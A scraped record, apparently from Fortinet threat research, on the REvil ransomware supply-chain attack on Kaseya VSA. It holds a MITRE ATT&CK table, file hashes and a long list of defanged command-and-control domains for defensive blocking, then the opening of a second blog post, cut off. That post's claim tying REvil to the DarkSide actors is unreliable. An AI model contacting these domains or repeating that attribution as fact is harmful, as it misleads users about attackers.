Labs has IPS coverage in place as: Kaseya.VSA.Remote.Code.Execution All known network IOCs are blocked by the WebFiltering client . For FortiSandbox , all publicly known ransomware samples are detected by our behavior-based protection. Additional Content FortiEDR KB Article How FortiEDR detects ransomware attack on Kaseya VSA (fortinet.com) FortiGuard Threat Signal Threat Signal Report | FortiGuard Fortinet Blog Post New Supply Chain Ransomware Attack Targets Kaseya Platform | FortiGuard Labs (fortinet.com) Appendix A: MITRE ATT&CK Techniques ID Description T1195.002 Supply Chain Compromise: Compromise Software Supply Chain T1059.001 Command and Scripting Interpreter: PowerShell T1059.003 Command and Scripting Interpreter: Windows Command Shell T1569.002 System Services: Service Execution T1574.002 Hijack Execution Flow: DLL Side-Loading T1068 Exploitation for Privilege Escalation T1562.004 Impair Defenses: Disable or Modify System Firewall T1562.001 Impair Defenses: Disable or Modify Tools T1070.004 Indicator Removal on Host: File Deletion T1036.003 Masquerading: Rename System Utilities T1036.005 Masquerading: Match Legitimate Name or Location T1027.001 Obfuscated Files or Information: Binary Padding T1027.004 Obfuscated Files or Information: Compile After Delivery T1218 Signed Binary Proxy Execution T1553.002 Subvert Trust Controls: Code Signing T1486 Data Encrypted for Impact Appendix B: IOCs File Hashes (SHA256) d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e (ransomware) E2a24ab94f865caeacdf2c3ad015f31f23008ac6db8312c2cbfb32e4a5466ea2 (mpsvc.dll) Filenames mpsvc.dll <random string>-readme.txt <random string2>.bmp File Paths Users\\{username}AppData\\Local\\Temp Domains and C&Cs boisehosting[.]net fotoideaymedia[.]es juneauopioidworkgroup[.]org vancouver-print[.]ca olejack[.]ru i-trust[.]dk thenewrejuveme[.]com xn--singlebrsen-vergleich-nec[.]com cursoporcelanatoliquido[.]online marietteaernoudts[.]nl klimt2012[.]info accountancywijchen[.]nl vannesteconstruct[.]be wellplast[.]se facettenreich27[.]de balticdermatology[.]lt sofavietxinh[.]com jorgobe[.]at ruralarcoiris[.]com projetlyonturin[.]fr international-sound-awards[.]com krlosdavid[.]com i-arslan[.]de caribbeansunpoker[.]com kissit[.]ca dezatec[.]es hkr-reise[.]de id-vet[.]com bayoga[.]co[.]uk solhaug[.]tk boldcitydowntown[.]com homecomingstudio[.]com dushka[.]ua hiddencitysecrets[.]com[.]au no-plans[.]com schoolofpassivewealth[.]com talentwunder[.]com acomprarseguidores[.]com argos[.]wityu[.]fund dinslips[.]se foretprivee[.]ca nurturingwisdom[.]com lescomtesdemean[.]be firstpaymentservices[.]com lusak[.]at better[.]town id-et-d[.]fr sanaia[.]com gantungankunciakrilikbandung[.]com moveonnews[.]com littlebird[.]salon iyengaryogacharlotte[.]com body-guards[.]it calabasasdigest[.]com corola[.]es pomodori-pizzeria[.]de seagatesthreecharters[.]com copystar[.]co[.]uk koko-nora[.]dk jakekozmor[.]com precisionbevel[.]com boulderwelt-muenchen-west[.]de nosuchthingasgovernment[.]com neuschelectrical[.]co[.]za bunburyfreightservices[.]com[.]au edelman[.]jp smithmediastrategies[.]com enovos[.]de shhealthlaw[.]com freie-baugutachterpraxis[.]de deltacleta[.]cat financescorecard[.]com leoben[.]at pawsuppetlovers[.]com testcoreprohealthuk[.]com broseller[.]com notmissingout[.]com chavesdoareeiro[.]com imaginado[.]de craftleathermnl[.]com global-kids[.]info serce[.]info[.]pl fannmedias[.]com villa-marrakesch[.]de bowengroup[.]com[.]au sairaku[.]net alysonhoward[.]com sahalstore[.]com adoptioperheet[.]fi miriamgrimm[.]de live-your-life[.]jp mardenherefordshire-pc[.]gov[.]uk kojima-shihou[.]com nuzech[.]com gamesboard[.]info podsosnami[.]ru hmsdanmark[.]dk linnankellari[.]fi rozemondcoaching[.]nl lenreactiv-shop[.]ru love30-chanko[.]com smartypractice[.]com www1[.]proresult[.]no rhinosfootballacademy[.]com zimmerei-deboer[.]de ccpbroadband[.]com bimnapratica[.]com lachofikschiet[.]nl antiaginghealthbenefits[.]com simulatebrain[.]com helikoptervluchtnewyork[.]nl devlaur[.]com pelorus[.]group kedak[.]de anybookreader[.]de markelbroch[.]com latestmodsapks[.]com thedresserie[.]com thailandholic[.]com tophumanservicescourses[.]com forestlakeuca[.]org[.]au sporthamper[.]com colorofhorses[.]com iqbalscientific[.]com microcirc[.]net mbfagency[.]com peterstrobos[.]com consultaractadenacimiento[.]com despedidascostablanca[.]es alten-mebel63[.]ru rimborsobancario[.]net pasvenska[.]se pickanose[.]com licor43[.]de buymedical[.]biz oncarrot[.]com milsing[.]hr sotsioloogia[.]ee visiativ-industry[.]fr transliminaltribe[.]wordpress[.]com d2marketing[.]co[.]uk lapinlviasennus[.]fi songunceliptv[.]com baronloan[.]org bastutunnan[.]se blogdecachorros[.]com vanswigchemdesign[.]com gporf[.]fr itelagen[.]com transportesycementoshidalgo[.]es milltimber[.]aberdeen[.]sch[.]uk tinkoff-mobayl[.]ru newyou[.]at zenderthelender[.]com sweering[.]fr tux-espacios[.]com all-turtles[.]com coffreo[.]biz tennisclubetten[.]nl extraordinaryoutdoors[.]com verytycs[.]com manijaipur[.]com beautychance[.]se pocket-opera[.]de finediningweek[.]pl stampagrafica[.]es upplandsspar[.]se tradiematepro[.]com[.]au campus2day[.]de burkert-ideenreich[.]de eaglemeetstiger[.]de mountaintoptinyhomes[.]com biapi-coaching[.]fr art2gointerieurprojecten[.]nl abogadosaccidentetraficosevilla[.]es camsadviser[.]com schmalhorst[.]de bigler-hrconsulting[.]ch agence-chocolat-noir[.]com stormwall[.]se mooglee[.]com smart-light[.]co[.]uk wari[.]com[.]pe takeflat[.]com humanityplus[.]org otsu-bon[.]com 35-40konkatsu[.]net zzyjtsgls[.]com drnice[.]de lightair[.]com hotelsolbh[.]com[.]br julis-lsa[.]de educar[.]org kuntokeskusrok[.]fi autodemontagenijmegen[.]nl spylista[.]com micahkoleoso[.]de fairfriends18[.]de macabaneaupaysflechois[.]com osterberg[.]fi mirkoreisser[.]de tomoiyuma[.]com hardinggroup[.]com zso-mannheim[.]de pointos[.]com kenhnoithatgo[.]com werkkring[.]nl hotelzentral[.]at mrxermon[.]de bloggyboulga[.]net beyondmarcomdotcom[.]wordpress[.]com wraithco[.]com lucidinvestbank[.]com ncs-graphic-studio[.]com tongdaifpthaiphong[.]net solerluethi-allart[.]ch vibehouse[.]rw bridgeloanslenders[.]com pier40forall[.]org ostheimer[.]at jenniferandersonwriter[.]com marcuswhitten[.]site lebellevue[.]fr the-virtualizer[.]com myhealth[.]net[.]au helenekowalsky[.]com havecamerawilltravel2017[.]wordpress[.]com muamuadolls[.]com jandaonline[.]com datacenters-in-europe[.]com pv-design[.]de opatrovanie-ako[.]sk vloeren-nu[.]nl conasmanagement[.]de lykkeliv[.]net adultgamezone[.]com patrickfoundation[.]net tonelektro[.]nl body-armour[.]online nsec[.]se vihannesporssi[.]fi new[.]devon[.]gov[.]uk pogypneu[.]sk creative-waves[.]co[.]uk parkstreetauto[.]net sloverse[.]com diversiapsicologia[.]es unetica[.]fr n1-headache[.]com amerikansktgodis[.]se qualitaetstag[.]de kath-kirche-gera[.]de berlin-bamboo-bikes[.]org minipara[.]com ontrailsandboulevards[.]com babcockchurch[.]org mylolis[.]com fax-payday-loans[.]com calxplus[.]eu mountsoul[.]de fundaciongregal[.]org klusbeter[.]nl labobit[.]it romeguidedvisit[.]com theclubms[.]com whittier5k[.]com ravensnesthomegoods[.]com nhadatcanho247[.]com purposeadvisorsolutions[.]com faizanullah[.]com work2live[.]de stoneys[.]ch psa-sec[.]de hushavefritid[.]dk tecnojobsnet[.]com starsarecircular[.]org garage-lecompte-rouen[.]fr hypozentrum[.]com denovofoodsgroup[.]com planchaavapor[.]net aco-media[.]nl abogadoengijon[.]es thee[.]network stacyloeb[.]com milanonotai[.]it kevinjodea[.]com operaslovakia[.]sk corelifenutrition[.]com mastertechengineering[.]com pinkexcel[.]com katketytaanet[.]fi lascuola[.]nl ligiercenter-sachsen[.]de answerstest[.]ru dnepr-beskid[.]com[.]ua eco-southafrica[.]com bingonearme[.]org summitmarketingstrategies[.]com scenepublique[.]net monark[.]com spd-ehningen[.]de boosthybrid[.]com[.]au petnest[.]ir associacioesportivapolitg[.]cat sarbatkhalsafoundation[.]org solinegraphic[.]com mylovelybluesky[.]com run4study[.]com nicoleaeschbachorg[.]wordpress[.]com architekturbuero-wagner[.]net lukeshepley[.]wordpress[.]com igfap[.]com tinyagency[.]com familypark40[.]com architecturalfiberglass[.]org slupetzky[.]at groupe-frayssinet[.]fr synlab[.]lt insigniapmg[.]com arteservicefabbro[.]com rehabilitationcentersinhouston[.]net zervicethai[.]co[.]th comarenterprises[.]com courteney-cox[.]net noesis[.]tech urmasiimariiuniri[.]ro remcakram[.]com degroenetunnel[.]com ceid[.]info[.]tr gemeentehetkompas[.]nl ivivo[.]es braffinjurylawfirm[.]com ctrler[.]cn makeitcount[.]at nijaplay[.]com brandl-blumen[.]de apprendrelaudit[.]com securityfmm[.]com sla-paris[.]com figura[.]team handi-jack-llc[.]com femxarxa[.]cat admos-gleitlager[.]de liikelataamo[.]fi stefanpasch[.]me wacochamber[.]com ilive[.]lt fensterbau-ziegler[.]de botanicinnovations[.]com saxtec[.]com tarotdeseidel[.]com bildungsunderlebnis[.]haus digivod[.]de darrenkeslerministries[.]com galserwis[.]pl eraorastudio[.]com jyzdesign[.]com suncrestcabinets[.]ca thomas-hospital[.]de embracinghiscall[.]com richard-felix[.]co[.]uk sipstroysochi[.]ru bodyforwife[.]com katiekerr[.]co[.]uk slashdb[.]com selfoutlet[.]com d1franchise[.]com anthonystreetrimming[.]com journeybacktolife[.]com pferdebiester[.]de parks-nuernberg[.]de div-vertriebsforschung[.]de verbisonline[.]com onlybacklink[.]com waveneyrivercentre[.]co[.]uk mytechnoway[.]com maryloutaylor[.]com whyinterestingly[.]ru blumenhof-wegleitner[.]at punchbaby[.]com vermoote[.]de johnsonfamilyfarmblog[.]wordpress[.]com cwsitservices[.]co[.]uk hairstylesnow[.]site web[.]ion[.]ag simoneblum[.]de naturavetal[.]hr heliomotion[.]com mirjamholleman[.]nl baumkuchenexpo[.]jp porno-gringo[.]com penco[.]ie ftlc[.]es dutchbrewingcoffee[.]com c-a[.]co[.]in nokesvilledentistry[.]com berliner-versicherungsvergleich[.]de jsfg[.]com cerebralforce[.]net rota-installations[.]co[.]uk roygolden[.]com verifort-capital[.]de 1kbk[.]com[.]ua noixdecocom[.]fr danielblum[.]info thaysa[.]com charlesreger[.]com kaliber[.]co[.]jp ahouseforlease[.]com binder-buerotechnik[.]at zweerscreatives[.]nl dramagickcom[.]wordpress[.]com ogdenvision[.]com gadgetedges[.]com pridoxmaterieel[.]nl heidelbergartstudio[.]gallery meusharklinithome[.]wordpress[.]com xn--thucmctc-13a1357egba[.]com homesdollar[.]com ncuccr[.]org oslomf[.]no desert-trails[.]com vorotauu[.]ru lionware[.]de bptdmaluku[.]com bogdanpeptine[.]ro innote[.]fi 365questions[.]org teknoz[.]net layrshift[.]eu upmrkt[.]co modelmaking[.]nl sachnendoc[.]com thedad[.]com bauertree[.]com woodleyacademy[.]org jasonbaileystudio[.]com cheminpsy[.]fr bee4win[.]com fiscalsort[.]com fotoscondron[.]com DupontSellsHomes[.]com nacktfalter[.]de devok[.]info mrtour[.]site hannah-fink[.]de cuspdental[.]com philippedebroca[.]com delchacay[.]com[.]ar cortec-neuro[.]com fitnessingbyjessica[.]com dsl-ip[.]de mmgdouai[.]fr daniel-akermann-architektur-und-planung[.]ch executiveairllc[.]com allamatberedare[.]se henricekupper[.]com shsthepapercut[.]com dr-seleznev[.]com siliconbeach-realestate[.]com gratispresent[.]se softsproductkey[.]com marketingsulweb[.]com craigvalentineacademy[.]com pasivect[.]co[.]uk cyntox[.]com fizzl[.]ru oemands[.]dk sexandfessenjoon[.]wordpress[.]com first-2-aid-u[.]com celeclub[.]org urist-bogatyr[.]ru piajeppesen[.]dk joseconstela[.]com analiticapublica[.]es kariokids[.]com ai-spt[.]jp homng[.]net csgospeltips[.]se luxurytv[.]jp bbsmobler[.]se restaurantesszimmer[.]de chaotrang[.]com galleryartfair[.]com steampluscarpetandfloors[.]com waermetauscher-berechnen[.]de shiresresidential[.]com naswrrg[.]org triggi[.]de cityorchardhtx[.]com dubnew[.]com stallbyggen[.]se zewatchers[.]com bouquet-de-roses[.]com wasmachtmeinfonds[.]at appsformacpc[.]com sabel-bf[.]com seminoc[.]com tastewilliamsburg[.]com charlottepoudroux-photographie[.]fr creamery201[.]com rerekatu[.]com andersongilmour[.]co[.]uk bradynursery[.]com artige[.]com highlinesouthasc[.]com danskretursystem[.]dk higadograsoweb[.]com kidbucketlist[.]com[.]au harpershologram[.]wordpress[.]com durganews[.]com leather-factory[.]co[.]jp mir-na-iznanku[.]com ki-lowroermond[.]nl cite4me[.]org grelot-home[.]com gasolspecialisten[.]se vyhino-zhulebino-24[.]ru jadwalbolanet[.]info ncid[.]bc[.]ca sojamindbody[.]com castillobalduz[.]es danubecloud[.]com roadwarrior[.]app senson[.]fi denifl-consulting[.]at myzk[.]site theapifactory[.]com kalkulator-oszczednosci[.]pl wurmpower[.]at funjose[.]org[.]gt blgr[.]be malychanieruchomoscipremium[.]com travelffeine[.]com smessier[.]com kafu[.]ch prochain-voyage[.]net edrcreditservices[.]nl bhwlawfirm[.]com bigbaguettes[.]eu toponlinecasinosuk[.]co[.]uk zonamovie21[.]net elimchan[.]com herbstfeststaefa[.]ch controldekk[.]com lichencafe[.]com systemate[.]dk alsace-first[.]com mousepad-direkt[.]de iwelt[.]de chatizel-paysage[.]fr praxis-foerderdiagnostik[.]de schmalhorst[.]de mediaclan[.]info backstreetpub[.]com spsshomeworkhelp[.]com loprus[.]pl bsaship[.]com maxadams[.]london deprobatehelp[.]com maureenbreezedancetheater[.]org plv[.]media tuuliautio[.]fi paradicepacks[.]com iyahayki[.]nl lorenacarnero[.]com mezhdu-delom[.]ru hugoversichert[.]de sauschneider[.]info atalent[.]fi agence-referencement-naturel-geneve[.]net zimmerei-fl[.]de ulyssemarketing[.]com x-ray[.]ca southeasternacademyofprosthodontics[.]org modamilyon[.]com triactis[.]com panelsandwichmadrid[.]es filmstreamingvfcomplet[.]be kostenlose-webcams[.]com instatron[.]net mirjamholleman[.]nl basisschooldezonnewijzer[.]nl quemargrasa[.]net extensionmaison[.]info retroearthstudio[.]com schoellhammer[.]com elpa[.]se uranus[.]nl advokathuset[.]dk rebeccarisher[.]com cafemattmeera[.]com polychromelabs[.]com notsilentmd[.]org iwr[.]nl wychowanieprzedszkolne[.]pl memaag[.]com parking[.]netgateway[.]eu digi-talents[.]com hairnetty[.]wordpress[.]com cimanchesterescorts[.]co[.]uk houseofplus[.]com lapmangfpt[.]info[.]vn pivoineetc[.]fr celularity[.]com rafaut[.]com bigasgrup[.]com slimidealherbal[.]com aakritpatel[.]com navyfederalautooverseas[.]com psnacademy[.]in michaelsmeriglioracing[.]com cleliaekiko[.]online stemplusacademy[.]com theduke[.]de drinkseed[.]com huissier-creteil[.]com geoffreymeuli[.]com theadventureedge[.]com profectis[.]de tampaallen[.]com symphonyenvironmental[.]com aniblinova[.]wordpress[.]com ventti[.]com[.]ar nachhilfe-unterricht[.]com mapawood[.]com nativeformulas[.]com kirkepartner[.]dk chefdays[.]de cursosgratuitosnainternet[.]com miraclediet[.]fun bristolaeroclub[.]co[.]uk idemblogs[.]com eglectonk[.]online finde-deine-marke[.]de platformier[.]com pmc-services[.]de atmos-show[.]com gymnasedumanagement[.]com siluet-decor[.]ru expandet[.]dk rumahminangberdaya[.]com artallnightdc[.]com tomaso[.]gr ecopro-kanto[.]com spacecitysisters[.]org tandartspraktijkheesch[.]nl vietlawconsultancy[.]com crowcanyon[.]com classycurtainsltd[.]co[.]uk veybachcenter[.]de falcou[.]fr christ-michael[.]net vdberg-autoimport[.]nl naturalrapids[.]com ussmontanacommittee[.]us oneplusresource[.]org maasreusel[.]nl you-bysia[.]com[.]au mediaacademy-iraq[.]org stemenstilte[.]nl noskierrenteria[.]com corendonhotels[.]com ditog[.]fr limassoldriving[.]com worldhealthbasicinfo[.]com girlillamarketing[.]com xn--rumung-bua[.]online collaborativeclassroom[.]org baptisttabernacle[.]com fitovitaforum[.]com c2e-poitiers[.]com logopaedie-blomberg[.]de mrsplans[.]net onlyresultsmarketing[.]com interactcenter[.]org spectrmash[.]ru tenacitytenfold[.]com huesges-gruppe[.]de promalaga[.]es myteamgenius[.]com darnallwellbeing[.]org[.]uk truenyc[.]co comparatif-lave-linge[.]fr allfortheloveofyou[.]com ilso[.]net haremnick[.]com ecoledansemulhouse[.]fr surespark[.]org[.]uk stupbratt[.]no tigsltd[.]com manifestinglab[.]com yousay[.]site dublikator[.]com ausbeverage[.]com[.]au testzandbakmetmening[.]online vibethink[.]net 123vrachi[.]ru bouldercafe-wuppertal[.]de sobreholanda[.]com bookspeopleplaces[.]com montrium[.]com stingraybeach[.]com aglend[.]com[.]au coursio[.]com otto-bollmann[.]de erstatningsadvokaterne[.]dk resortmtn[.]com quickyfunds[.]com aminaboutique247[.]com mediaplayertest[.]net irinaverwer[.]com outcomeisincome[.]com gonzalezfornes[.]es xn--fn-kka[.]no withahmed[.]com balticdentists[.]com mank[.]de gw2guilds[.]org raschlosser[.]de ausair[.]com[.]au commonground-stories[.]com dlc[.]berlin liveottelut[.]com hexcreatives[.]co citymax-cr[.]com atozdistribution[.]co[.]uk urclan[.]net autopfand24[.]de syndikat-asphaltfieber[.]de teczowadolina[.]bytom[.]pl antonmack[.]de htchorst[.]nl xn--fnsterputssollentuna-39b[.]se candyhouseusa[.]com tsklogistik[.]eu drfoyle[.]com cranleighscoutgroup[.]org evangelische-pfarrgemeinde-tuniberg[.]de fransespiegels[.]nl alhashem[.]net schutting-info[.]nl blood-sports[.]net milestoneshows[.]com healthyyworkout[.]com plantag[.]de praxis-management-plus[.]de smokeysstoves[.]com dubscollective[.]com luckypatcher-apkz[.]com jobmap[.]at oldschoolfun[.]net carrybrands[.]nl people-biz[.]com jolly-events[.]com kisplanning[.]com[.]au vetapharma[.]fr hihaho[.]com directwindowco[.]com herbayupro[.]com webhostingsrbija[.]rs lange[.]host lloydconstruction[.]com ra-staudte[.]de twohourswithlena[.]wordpress[.]com stoeferlehalle[.]de nestor-swiss[.]ch thomasvicino[.]com dr-pipi[.]de qlog[.]de bestbet[.]com liliesandbeauties[.]org bundabergeyeclinic[.]com[.]au sandd[.]nl easytrans[.]com[.]au westdeptfordbuyrite[.]com hashkasolutindo[.]com compliancesolutionsstrategies[.]com cnoia[.]org aprepol[.]com assurancesalextrespaille[.]fr paymybill[.]guru airconditioning-waalwijk[.]nl pixelarttees[.]com dutchcoder[.]nl iphoneszervizbudapest[.]hu completeweddingkansas[.]com wolf-glas-und-kunst[.]de seitzdruck[.]com alvinschwartz[.]wordpress[.]com launchhubl[.]com revezlimage[.]com 12starhd[.]online jerling[.]de skiltogprint[.]no craigmccabe[.]fun pierrehale[.]com cactusthebrand[.]com mindpackstudios[.]com vitavia[.]lt bockamp[.]com levihotelspa[.]fi alfa-stroy72[.]com boompinoy[.]com sinal[.]org qualitus[.]com kamienny-dywan24[.]pl ilcdover[.]com team-montage[.]dk iviaggisonciliegie[.]it vickiegrayimages[.]com ziegler-praezisionsteile[.]de trapiantofue[.]it space[.]ua 8449nohate[.]org xltyu[.]com strandcampingdoonbeg[.]com haar-spange[.]com stopilhan[.]com dareckleyministries[.]com pcprofessor[.]com bordercollie-nim[.]nl foryourhealth[.]live seproc[.]hn lubetkinmediacompanies[.]com ouryoungminds[.]wordpress[.]com geisterradler[.]de morawe-krueger[.]de vitalyscenter[.]es jvanvlietdichter[.]nl wsoil[.]com[.]sg xlarge[.]at sevenadvertising[.]com nancy-informatique[.]fr aurum-juweliere[.]de hatech[.]io zflas[.]com thefixhut[.]com tips[.]technology smalltownideamill[.]wordpress[.]com brevitempore[.]net imadarchid[.]com smhydro[.]com[.]pl echtveilig[.]nl faroairporttransfers[.]net connectedace[.]com offroadbeasts[.]com teresianmedia[.]org ralister[.]co[.]uk rosavalamedahr[.]com todocaracoles[.]com shiftinspiration[.]com sportsmassoren[.]com trystana[.]com personalenhancementcenter[.]com proudground[.]org forskolorna[.]org brawnmediany[.]com kao[.]at asteriag[.]com centromarysalud[.]com asiluxury[.]com radaradvies[.]nl daklesa[.]de fitnessbazaar[.]com fibrofolliculoma[.]info maratonaclubedeportugal[.]com maineemploymentlawyerblog[.]com wmiadmin[.]com bxdf[.]info plastidip[.]com[.]ar autofolierung-lu[.]de mymoneyforex[.]com victoriousfestival[.]co[.]uk carolinepenn[.]com blacksirius[.]de rollingrockcolumbia[.]com judithjansen[.]com insidegarage[.]pl irishmachineryauctions[.]com jacquin-maquettes[.]com anteniti[.]com behavioralmedicinespecialists[.]com socialonemedia[.]com chandlerpd[.]com aunexis[.]ch vesinhnha[.]com[.]vn joyeriaorindia[.]com presseclub-magdeburg[.]de yamalevents[.]com delawarecorporatelaw[.]com jiloc[.]com entopic[.]com hellohope[.]com mdk-mediadesign[.]de nataschawessels[.]com almosthomedogrescue[.]dog reddysbakery[.]com happyeasterimages[.]org dr-tremel-rednitzhembach[.]de commercialboatbuilding[.]com argenblogs[.]com[.]ar izzi360[.]com turkcaparbariatrics[.]com ftf[.]or[.]at kaminscy[.]com tstaffing[.]nl abogadosadomicilio[.]es caffeinternet[.]it abogados-en-alicante[.]es gastsicht[.]de nvwoodwerks[.]com bodyfulls[.]com myhostcloud[.]com perbudget[.]com strategicstatements[.]com sanyue119[.]com walter-lemm[.]de blog[.]solutionsarchitect[.]guru parkcf[.]nl nandistribution[.]nl ledmes[.]ru mercantedifiori[.]com artotelamsterdam[.]com dw-css[.]de leda-ukraine[.]com[.]ua devstyle[.]org kindersitze-vergleich[.]de jeanlouissibomana[.]com huehnerauge-entfernen[.]de brigitte-erler[.]com imperfectstore[.]com esope-formation[.]fr mariposapropaneaz[.]com bafuncs[.]org kampotpepper[.]gives abitur-undwieweiter[.]de hoteledenpadova[.]it theshungiteexperience[.]com[.]au deschl[.]net officehymy[.]com shadebarandgrillorlando[.]com xn--logopdie-leverkusen-kwb[.]de buroludo[.]nl servicegsm[.]net kingfamily[.]construction lbcframingelectrical[.]com ladelirante[.]fr tanzprojekt[.]com fatfreezingmachines[.]com marathonerpaolo[.]com gopackapp[.]com catholicmusicfest[.]com gaiam[.]nl advizewealth[.]com y-archive[.]com mrsfieldskc[.]com levdittliv[.]se simpkinsedwards[.]co[.]uk the-domain-trader[.]com lapinvihreat[.]fi ecpmedia[.]vn carlosja[.]com real-estate-experts[.]com leeuwardenstudentcity[.]nl psc[.]de em-gmbh[.]ch trulynolen[.]co[.]uk abuelos[.]com birnam-wood[.]com insp[.]bi besttechie[.]com 321play[.]com[.]hk saka[.]gr sterlingessay[.]com justinvieira[.]com spinheal[.]ru slimani[.]net narcert[.]com koken-voor-baby[.]nl smejump[.]co[.]th seevilla-dr-sturm[.]at dekkinngay[.]com friendsandbrgrs[.]com coastalbridgeadvisors[.]com ceres[.]org[.]au 2ekeus[.]nl aselbermachen[.]com physiofischer[.]de makeurvoiceheard[.]com krcove-zily[.]eu aarvorg[.]com longislandelderlaw[.]com crowd-patch[.]co[.]uk epwritescom[.]wordpress[.]com supportsumba[.]nl abl1[.]net ohidesign[.]com blossombeyond50[.]com coding-machine[.]com rostoncastings[.]co[.]uk promesapuertorico[.]com tulsawaterheaterinstallation[.]com musictreehouse[.]net pay4essays[.]net karacaoglu[.]nl baustb[.]de bricotienda[.]com mbxvii[.]com asgestion[.]com merzi[.]info newstap[.]com[.]ng kmbshipping[.]co[.]uk lmtprovisions[.]com lynsayshepherd[.]co[.]uk midmohandyman[.]com norovirus-ratgeber[.]de drugdevice[.]org americafirstcommittee[.]org readberserk[.]com carriagehousesalonvt[.]com latribuessentielle[.]com edgewoodestates[.]org ikads[.]org rieed[.]de yassir[.]pro xoabigail[.]com edv-live[.]de freie-gewerkschaften[.]de caribdoctor[.]org allentownpapershow[.]com thewellnessmimi[.]com employeesurveys[.]com lefumetdesdombes[.]com knowledgemuseumbd[.]com webmaster-peloton[.]com dontpassthepepper[.]com dirittosanitario[.]biz kaotikkustomz[.]com globedivers[.]wordpress[.]com puertamatic[.]es ihr-news[.]jp 101gowrie[.]com lillegrandpalais[.]com bouncingbonanza[.]com importardechina[.]info exenberger[.]at baylegacy[.]com mdacares[.]com winrace[.]no deepsouthclothingcompany[.]com 1team[.]es humancondition[.]com satyayoga[.]de austinlchurch[.]com jusibe[.]com crediacces[.]com conexa4papers[.]trade odiclinic[.]org augenta[.]com kikedeoliveira[.]com schraven[.]de pmcimpact[.]com pubweb[.]carnet[.]hr sportverein-tambach[.]de xn--vrftet-pua[.]biz hrabritelefon[.]hr deoudedorpskernnoordwijk[.]nl ianaswanson[.]com euro-trend[.]pl micro-automation[.]de actecfoundation[.]org nmiec[.]com polzine[.]net crosspointefellowship[.]church mooreslawngarden[.]com groupe-cets[.]com ora-it[.]de ateliergamila[.]com bargningavesta[.]se centuryrs[.]com makeflowers[.]ru goodgirlrecovery[.]com greenpark[.]ch pt-arnold[.]de tanzschule-kieber[.]de sportiomsportfondsen[.]nl samnewbyjax[.]com schlafsack-test[.]net rushhourappliances[.]com pcp-nc[.]com marchand-sloboda[.]com greenfieldoptimaldentalcare[.]com unim[.]su quizzingbee[.]com phantastyk[.]com campusoutreach[.]org wien-mitte[.]co[.]at ino-professional[.]ru jbbjw[.]com walkingdeadnj[.]com effortlesspromo[.]com uimaan[.]fi troegs[.]com hvccfloorcare[.]com skanah[.]com chrissieperry[.]com mepavex[.]nl sagadc[.]com videomarketing[.]pro fayrecreations[.]com hhcourier[.]com kosterra[.]com vox-surveys[.]com harveybp[.]com partnertaxi[.]sk highimpactoutdoors[.]net faronics[.]com farhaani[.]com jameskibbie[.]com trackyourconstruction[.]com christinarebuffetcourses[.]com poultrypartners[.]nl antenanavi[.]com intecwi[.]com danholzmann[.]com hebkft[.]hu gasbarre[.]com cirugiauretra[.]es polymedia[.]dk gmto[.]fr centrospgolega[.]com greenko[.]pl bierensgebakkramen[.]nl renergysolution[.]com deko4you[.]at icpcnj[.]org apolomarcas[.]com flexicloud[.]hk associationanalytics[.]com smale-opticiens[.]nl 4net[.]guru waynela[.]com beaconhealthsystem[.]org mikeramirezcpa[.]com aodaichandung[.]com heurigen-bauer[.]at xtptrack[.]com spargel-kochen[.]de ivfminiua[.]com filmvideoweb[.]com kadesignandbuild[.]co[.]uk igorbarbosa[.]com kojinsaisei[.]info evologic-technologies[.]com naturstein-hotte[.]de slwgs[.]org streamerzradio1[.]site amylendscrestview[.]com igrealestate[.]com simpliza[.]com mooshine[.]com cuppacap[.]com ungsvenskarna[.]se themadbotter[.]com torgbodenbollnas[.]se coding-marking[.]com paulisdogshop[.]de plotlinecreative[.]com refluxreducer[.]com destinationclients[.]fr frontierweldingllc[.]com live-con-arte[.]de corona-handles[.]com eadsmurraypugh[.]com blewback[.]com shonacox[.]com hokagestore[.]com sw1m[.]ru glennroberts[.]co[.]nz ampisolabergeggi[.]it oneheartwarriors[.]at tanciu[.]com grupocarvalhoerodrigues[.]com[.]br biortaggivaldelsa[.]com allure-cosmetics[.]at bargningharnosand[.]se smogathon[.]com ymca-cw[.]org[.]uk webcodingstudio[.]com nakupunafoundation[.]org lecantou-coworking[.]com clos-galant[.]com madinblack[.]com kamahouse[.]net socstrp[.]org manutouchmassage[.]com jobcenterkenya[.]com woodworkersolution[.]com stoeberstuuv[.]de saarland-thermen-resort[.]com kunze-immobilien[.]de rksbusiness[.]com simplyblessedbykeepingitreal[.]com rocketccw[.]com croftprecision[.]co[.]uk zieglerbrothers[.]de geekwork[.]pl toreria[.]es parebrise-tla[.]fr tetinfo[.]in 4youbeautysalon[.]com oceanastudios[.]com portoesdofarrobo[.]com theletter[.]company evergreen-fishing[.]com autodujos[.]lt yourobgyn[.]net tandartspraktijkhartjegroningen[.]nl dpo-as-a-service[.]com waywithwords[.]net norpol-yachting[.]com modestmanagement[.]com Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/new-supply-chain-ransomware-attack-targets-kaseya-platform": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-07-05",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Breaking Update A new global supply chain ransomware attack is currently targeting users of the Kaseya VSA platform—software that provides remote management of IT operations spanning service desk ticketing to performance monitoring and reporting. As a central management console, the Kaseya VSA platform is used by numerous managed service providers to remotely monitor and deploy software, updates, etc. to multiple machines simultaneously in a multi-user environment. Unofficial reports have identified the REvil ransomware threat actors as being behind this supply chain attack. REvil has been attributed to the DarkSide actors who most recently attacked Colonial Pipeline and JBS foods back in May. Those same unofficial reports claim that a malicious update was deployed to the Kaseya VSA interface by the threat actors as an update or hot fix for the Kaseya VSA agent. This fake update is a ransomware file, and it has now been downloaded to thousands of systems, including the machines of MSP providers and their customers who use Kaseya VSA. There are reports of ransom demands of $50,000 for smaller organizations and up to $5 million for larger enterprises. Kaseya is urging all customers to take all on-premises VSA servers offline immediately. Only on-premises systems have been impacted by this attack.Cloud-based SaaS services remain unaffected. The Kaseya advisory reads in part: \"ALL ON-PREMISES VSA SERVERS SHOULD CONTINUE TO REMAIN OFFLINE UNTIL FURTHER INSTRUCTIONS FROM KASEYA ABOUT WHEN IT IS SAFE 